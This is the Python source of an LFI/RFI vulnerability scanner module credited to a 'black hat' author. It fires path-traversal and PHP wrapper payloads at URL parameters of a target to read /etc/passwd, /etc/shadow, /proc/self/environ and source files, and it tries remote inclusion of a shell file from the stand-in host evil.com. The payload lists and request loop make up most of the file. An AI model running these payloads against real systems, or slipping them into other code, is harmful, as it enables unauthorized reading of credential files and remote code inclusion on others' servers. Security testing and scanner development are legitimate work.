# modules/vuln_scanner/lfi_rfi_scanner.py

"""
LFI/RFI Vulnerability Scanner
Author: ATHEX BLACK HAT
Team: Wolf Intelligence PK
Version: 1.0.0

Detects Local and Remote File Inclusion vulnerabilities
through path traversal and wrapper injection.
"""

import re
from typing import Dict, List, Any, Optional, Tuple
from urllib.parse import urlencode, urlparse, parse_qs

import requests
from requests.exceptions import RequestException, Timeout, ConnectionError


class LFIRFIScanner:
    """
    LFI/RFI vulnerability scanner.
    
    Tests for local and remote file inclusion using
    path traversal and PHP wrapper techniques.
    """
    
    LFI_PAYLOADS = [
        '../../../etc/passwd',
        '....//....//....//etc/passwd',
        '..%2f..%2f..%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '/etc/passwd',
        '/etc/shadow',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        '....\\....\\....\\windows\\win.ini',
        'php://filter/convert.base64-encode/resource=index.php',
        'php://filter/read=convert.base64-encode/resource=index.php',
        'php://input',
        'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
        '/proc/self/environ',
        '/proc/self/fd/0',
    ]
    
    RFI_PAYLOADS = [
        'http://evil.com/shell.txt',
        'https://evil.com/shell.txt',
        'ftp://evil.com/shell.txt',
        '//evil.com/shell.txt',
    ]
    
    LFI_OUTPUT_PATTERNS = [
        r'root:.:0:0:',
        r'daemon:.:1:1:',
        r'bin:.:2:2:',
        r'www-data',
        r'nobody:.:',
        r'\[extensions\]',
        r'\[fonts\]',
        r'PD9waHA',
        r'<?php',
    ]
    
    PARAMETER_NAMES = [
        'file', 'page', 'include', 'path', 'document',
        'folder', 'dir', 'template', 'view', 'load',
        'read', 'open', 'show', 'display', 'fetch',
    ]
    
    def __init__(
        self,
        target: str,
        config: Optional[Dict[str, Any]] = None
    ):
        """
        Initialize the LFI/RFI scanner.
        
        Args:
            target: Target URL
            config: Configuration dictionary
        """
        self.target = target.rstrip('/') if target else ''
        self.config = config or {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        
        self.timeout = self.config.get('timeout', 10)
        self.verify_ssl = self.config.get('verify_ssl', False)
        self.max_parameters = self.config.get('max_parameters', 20)
        self.max_payloads = self.config.get('max_payloads', 50)
        
        self.vulnerabilities: List[Dict[str, Any]] = []
        self.errors: List[str] = []
        self.scan_status: str = 'initialized'
        self._tested_count: int = 0
    
    def _safe_get_response_text(self, response: Optional[requests.Response]) -> str:
        """Safely get response text with fallback."""
        if response and hasattr(response, 'text'):
            return response.text or ''
        return ''
    
    def _is_valid_response(self, response: Optional[requests.Response]) -> bool:
        """Check if response is valid for analysis."""
        if response is None:
            return False
        if not hasattr(response, 'status_code'):
            return False
        return True
    
    def _validate_parameters(self, params: Dict[str, str]) -> Tuple[bool, str]:
        """
        Validate parameters before testing.
        
        Args:
            params: Dictionary of parameters
            
        Returns:
            Tuple of (is_valid, message)
        """
        if not params:
            return False, "No parameters found in URL"
        
        if len(params) > self.max_parameters:
            return False, f"Too many parameters ({len(params)} > {self.max_parameters})"
        
        return True, ""
    
    def _safe_extract_parameters(self, url: str) -> Dict[str, str]:
        """
        Safely extract URL parameters with error handling.
        
        Args:
            url: Target URL
            
        Returns:
            Dictionary of parameters
        """
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            param_dict = {}
            for key, values in params.items():
                if values and values[0]:
                    param_dict[key] = values[0]
                else:
                    param_dict[key] = ''
            
            return param_dict
            
        except Exception as e:
            self.errors.append(f"Failed to extract parameters: {str(e)}")
            return {}
    
    def extract_parameters(self, url: str) -> Dict[str, str]:
        """Extract URL parameters."""
        return self._safe_extract_parameters(url)
    
    def _normalize_payload(self, payload: str) -> str:
        """Clean and normalize payload."""
        return payload.strip()
    
    def _check_response_for_pattern(self, response_text: str, patterns: List[str]) -> Optional[str]:
        """
        Check response for pattern matches.
        
        Args:
            response_text: HTTP response text
            patterns: List of regex patterns
            
        Returns:
            Matched pattern or None
        """
        if not response_text:
            return None
        
        for pattern in patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return pattern
        
        return None
    
    def _get_test_parameters(self, params: Dict[str, str]) -> List[str]:
        """
        Get parameters to test with priority ordering.
        
        Args:
            params: Dictionary of parameters
            
        Returns:
            List of parameter names
        """
        # Prioritize common LFI/RFI parameter names
        priority_params = []
        other_params = []
        
        for param_name in params:
            if any(pn in param_name.lower() for pn in self.PARAMETER_NAMES):
                priority_params.append(param_name)
            else:
                other_params.append(param_name)
        
        # Return priority params first, then up to 5 others
        return priority_params + other_params[:5]
    
    def test_lfi_parameter(self, url: str, parameter: str) -> Optional[Dict[str, Any]]:
        """
        Test a single parameter for LFI.
        
        Args:
            url: Target URL
            parameter: Parameter name
            
        Returns:
            Dictionary with finding or None
        """
        # Limit payload count
        lfi_payloads = self.LFI_PAYLOADS[:self.max_payloads]
        
        for payload in lfi_payloads:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            params = self.extract_parameters(url)
            
            normalized_payload = self._normalize_payload(payload)
            params[parameter] = normalized_payload
            
            test_url = base_url + '?' + urlencode(params)
            
            try:
                response = self.session.get(
                    test_url,
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )
                self._tested_count += 1
                
                if self._is_valid_response(response):
                    response_text = self._safe_get_response_text(response)
                    
                    if response_text:
                        matched_pattern = self._check_response_for_pattern(
                            response_text, 
                            self.LFI_OUTPUT_PATTERNS
                        )
                        
                        if matched_pattern:
                            return {
                                'url': test_url,
                                'parameter': parameter,
                                'type': 'lfi',
                                'payload': payload,
                                'pattern_matched': matched_pattern,
                                'status_code': response.status_code,
                            }
                    
            except RequestException:
                continue
        
        return None
    
    def test_rfi_parameter(self, url: str, parameter: str) -> Optional[Dict[str, Any]]:
        """
        Test a single parameter for RFI.
        
        Args:
            url: Target URL
            parameter: Parameter name
            
        Returns:
            Dictionary with finding or None
        """
        for payload in self.RFI_PAYLOADS[:5]:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            params = self.extract_parameters(url)
            
            normalized_payload = self._normalize_payload(payload)
            params[parameter] = normalized_payload
            
            test_url = base_url + '?' + urlencode(params)
            
            try:
                response = self.session.get(
                    test_url,
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )
                self._tested_count += 1
                
                if self._is_valid_response(response):
                    response_text = self._safe_get_response_text(response)
                    
                    if response_text:
                        # Check for inclusion of RFI content
                        if 'evil.com' in response_text or 'shell.txt' in response_text:
                            return {
                                'url': test_url,
                                'parameter': parameter,
                                'type': 'rfi',
                                'payload': payload,
                                'status_code': response.status_code,
                            }
                    
            except RequestException:
                continue
        
        return None
    
    def test_parameter(self, url: str, parameter: str) -> Optional[Dict[str, Any]]:
        """
        Test a single parameter for LFI/RFI.
        
        Args:
            url: Target URL
            parameter: Parameter name
            
        Returns:
            Dictionary with finding or None
        """
        # Test LFI first
        lfi_result = self.test_lfi_parameter(url, parameter)
        if lfi_result:
            return lfi_result
        
        # Then test RFI
        rfi_result = self.test_rfi_parameter(url, parameter)
        if rfi_result:
            return rfi_result
        
        return None
    
    def run(self) -> Dict[str, Any]:
        """
        Run LFI/RFI scan.
        
        Returns:
            Dictionary with scan results
        """
        # Reset state
        self.vulnerabilities.clear()
        self.errors.clear()
        self._tested_count = 0
        self.scan_status = 'running'
        
        # Validate target
        if not self.target:
            self.errors.append("Target URL is empty")
            self.scan_status = 'failed'
            return {
                'findings': [],
                'errors': self.errors,
                'vulnerabilities_found': 0,
                'scan_status': 'failed',
                'error': 'Target URL is empty',
            }
        
        # Extract parameters
        params = self.extract_parameters(self.target)
        
        # Validate parameters
        valid, message = self._validate_parameters(params)
        if not valid:
            self.errors.append(message)
            self.scan_status = 'completed'
            return {
                'findings': [],
                'errors': self.errors,
                'vulnerabilities_found': 0,
                'scan_status': 'completed',
                'parameters_found': 0,
                'tests_performed': 0,
                'message': message,
            }
        
        if not params:
            self.errors.append("No parameters found in URL")
            self.scan_status = 'completed'
            return {
                'findings': [],
                'errors': self.errors,
                'vulnerabilities_found': 0,
                'scan_status': 'completed',
                'parameters_found': 0,
                'tests_performed': 0,
                'message': 'No parameters found in URL',
            }
        
        # Get test parameters with priority
        test_params = self._get_test_parameters(params)
        
        for param_name in test_params:
            result = self.test_parameter(self.target, param_name)
            
            if result:
                self.vulnerabilities.append(result)
        
        self.scan_status = 'completed'
        
        findings = []
        
        for vuln in self.vulnerabilities:
            vuln_type = 'Remote File Inclusion (RFI)' if vuln['type'] == 'rfi' else 'Local File Inclusion (LFI)'
            severity = 'critical' if vuln['type'] == 'lfi' else 'high'
            
            findings.append({
                'type': vuln_type,
                'severity': severity,
                'endpoint': vuln['url'],
                'parameter': vuln['parameter'],
                'description': f"{vuln_type} detected via parameter '{vuln['parameter']}' with payload '{vuln['payload']}'",
                'evidence': vuln,
                'remediation': 'Use whitelist for file inclusion. Validate and sanitize user input. Disable allow_url_include.',
            })
        
        return {
            'findings': findings,
            'errors': self.errors,
            'vulnerabilities_found': len(findings),
            'scan_status': self.scan_status,
            'parameters_found': len(params),
            'tests_performed': self._tested_count,
            'vulnerable_parameters': len(self.vulnerabilities),
        }
